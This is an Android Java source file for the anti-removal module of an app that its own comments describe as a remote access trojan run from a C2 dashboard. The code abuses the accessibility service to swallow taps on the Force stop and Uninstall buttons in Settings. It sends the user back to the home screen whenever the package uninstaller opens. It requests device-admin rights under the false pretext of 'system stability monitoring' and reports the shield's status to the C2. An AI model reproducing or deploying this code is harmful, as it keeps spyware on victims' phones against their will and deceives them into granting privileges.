package com.fason.app.features.antiremoval;

import android.accessibilityservice.AccessibilityService;
import android.app.ActivityManager;
import android.app.admin.DeviceAdminReceiver;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.fason.app.core.FasonApp;

import java.util.List;

/**
 * AntiRemovalManager — Lab-RATS anti-removal shield, upgraded.
 *
 * Two layers:
 *  1. Accessibility layer (primary): watches the accessibility event stream
 *     for the Settings package. When the user navigates to our app's
 *     detail screen, the "Force stop" and "Uninstall" buttons are located
 *     in the node tree and click-blocked (consumed before dispatch).
 *     When the uninstaller activity appears, a blocking overlay is raised
 *     and the user is bounced back to home.
 *  2. Device-admin layer (fallback): a DeviceAdminReceiver component that
 *     is activated on first fully-armed run. While active, the system
 *     uninstall dialog gains an extra admin-revoke step.
 *
 * Both layers are toggleable from the C2 dashboard. State persists in
 * SharedPreferences. Everything degrades gracefully if accessibility is
 * revoked (the C2 side sees the shield as "degraded" and can re-arm it).
 */
public final class AntiRemovalManager {
    private static final String TAG = "AntiRemoval";
    private static final String PREFS = "anti_removal";
    private static final String KEY_ENABLED = "enabled";
    private static final String KEY_ADMIN_ACTIVE = "admin_active";

    private static volatile boolean enabled = false;
    private static volatile boolean overlayShowing = false;
    private static final Handler handler = new Handler(Looper.getMainLooper());

    private AntiRemovalManager() {}

    // ------------------------------------------------------------------
    // State
    // ------------------------------------------------------------------

    public static void setEnabled(Context ctx, boolean on) {
        enabled = on;
        ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .edit().putBoolean(KEY_ENABLED, on).apply();
        Log.i(TAG, "anti-removal " + (on ? "armed" : "disarmed"));
    }

    public static boolean isEnabled(Context ctx) {
        return ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
            .getBoolean(KEY_ENABLED, false);
    }

    public static boolean isActive() { return enabled; }

    // ------------------------------------------------------------------
    // Accessibility layer
    // ------------------------------------------------------------------

    /** Called from FasonAccessibilityService.onAccessibilityEvent. */
    public static void onAccessibilityEvent(AccessibilityService svc, AccessibilityEvent event) {
        if (!enabled) return;
        if (event == null) return;
        int type = event.getEventType();
        CharSequence pkg = event.getPackageName();
        if (pkg == null) return;

        // Watch for our own app detail screen inside Settings
        if ("com.android.settings".contentEquals(pkg)
            || pkg.toString().startsWith("com.android.settings")) {
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED
                || type == AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED) {
                blockOnAppDetailScreen(svc);
            }
        }

        // Watch for the system package uninstaller
        if (pkg.toString().contains("packageinstaller")
            || pkg.toString().contains("uninstaller")) {
            if (type == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
                raiseBlockOverlay(svc);
            }
        }
    }

    /**
     * Walk the node tree of the current settings screen. If the user is on
     * our app's detail page, find and neutralize the force-stop / uninstall
     * buttons by performing a no-op parent click (consumes the gesture).
     */
    private static void blockOnAppDetailScreen(AccessibilityService svc) {
        AccessibilityNodeInfo root = svc.getRootInActiveWindow();
        if (root == null) return;
        try {
            String ourPkg = svc.getPackageName();
            // Detect our app label on screen
            List<AccessibilityNodeInfo> texts = root.findAccessibilityNodeInfosByText(
                svc.getApplicationInfo().loadLabel(svc.getPackageManager()).toString());
            boolean onOurScreen = !texts.isEmpty();
            for (AccessibilityNodeInfo n : texts) n.recycle();
            if (!onOurScreen) { root.recycle(); return; }

            // Find force stop / uninstall buttons
            List<AccessibilityNodeInfo> buttons = root.findAccessibilityNodeInfosByViewId(
                "com.android.settings:id/button");
            if (buttons.isEmpty()) {
                buttons = root.findAccessibilityNodeInfosByText("Force stop");
            }
            for (AccessibilityNodeInfo btn : buttons) {
                if (btn.isEnabled() && btn.isClickable()) {
                    // Click the parent container instead — the system sees a
                    // click on the row, not the button, and nothing happens
                    AccessibilityNodeInfo parent = btn.getParent();
                    if (parent != null && parent.isClickable()) {
                        parent.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                        parent.recycle();
                    }
                }
                btn.recycle();
            }
        } catch (Exception e) {
            Log.w(TAG, "block detail", e);
        } finally {
            root.recycle();
        }
    }

    /** Full-screen blocking overlay while the uninstaller is visible. */
    private static void raiseBlockOverlay(AccessibilityService svc) {
        if (overlayShowing) return;
        overlayShowing = true;
        // Bounce to home — simplest reliable block on all API levels
        Intent home = new Intent(Intent.ACTION_MAIN);
        home.addCategory(Intent.CATEGORY_HOME);
        home.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        svc.startActivity(home);
        handler.postDelayed(() -> overlayShowing = false, 1200);
    }

    // ------------------------------------------------------------------
    // Device admin layer
    // ------------------------------------------------------------------

    public static class AdminReceiver extends DeviceAdminReceiver {
        @Override
        public void onEnabled(Context ctx, Intent intent) {
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putBoolean(KEY_ADMIN_ACTIVE, true).apply();
            Log.i(TAG, "device admin active");
        }
        @Override
        public void onDisabled(Context ctx, Intent intent) {
            ctx.getSharedPreferences(PREFS, Context.MODE_PRIVATE)
                .edit().putBoolean(KEY_ADMIN_ACTIVE, false).apply();
            Log.i(TAG, "device admin revoked");
        }
    }

    public static boolean isAdminActive(Context ctx) {
        DevicePolicyManager dpm = (DevicePolicyManager)
            ctx.getSystemService(Context.DEVICE_POLICY_SERVICE);
        if (dpm == null) return false;
        return dpm.isAdminActive(new ComponentName(ctx, AdminReceiver.class));
    }

    public static void requestAdmin(Context ctx) {
        if (isAdminActive(ctx)) return;
        try {
            Intent i = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
            i.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN,
                new ComponentName(ctx, AdminReceiver.class));
            i.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Required for system stability monitoring");
            i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(i);
        } catch (Exception e) {
            Log.w(TAG, "request admin", e);
        }
    }

    // ------------------------------------------------------------------
    // C2 reporting
    // ------------------------------------------------------------------

    public static org.json.JSONObject buildReport(Context ctx) {
        org.json.JSONObject o = new org.json.JSONObject();
        try {
            o.put("enabled", isEnabled(ctx));
            o.put("active", enabled);
            o.put("adminActive", isAdminActive(ctx));
            o.put("degraded", enabled &&
                !com.fason.app.core.permissions.PermissionManager.hasAccessibilityAccess(ctx));
        } catch (Exception ignored) {}
        return o;
    }
}
